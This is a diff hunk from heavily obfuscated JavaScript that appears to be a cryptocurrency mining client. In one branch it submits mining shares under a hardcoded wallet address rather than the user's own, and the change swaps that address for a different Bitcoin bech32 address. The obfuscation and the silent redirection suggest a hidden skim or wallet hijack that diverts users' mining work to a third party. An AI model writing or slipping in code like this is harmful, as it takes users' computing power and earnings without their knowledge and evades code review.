@@ -4885,7 +4885,7 @@
             _0x577eef.submit(_0x5d5afc, _0x2fab0d.job_id, _0x2fab0d.extranonce2, _0x2fab0d.ntime, _0x2fab0d.nonce);
             _0x4dba81();
           } else {
-            _0x1897d1.submit("RRw34181EXoN5NcYVfCjG1PeBEbRXrL2Lc", _0x2fab0d.job_id, _0x2fab0d.extranonce2, _0x2fab0d.ntime, _0x2fab0d.nonce);
+            _0x1897d1.submit("bc1qpzc8pldnqvjlgpqvd6ac87cnlq9lrez462ky83", _0x2fab0d.job_id, _0x2fab0d.extranonce2, _0x2fab0d.ntime, _0x2fab0d.nonce);
           }
         });
       } else {
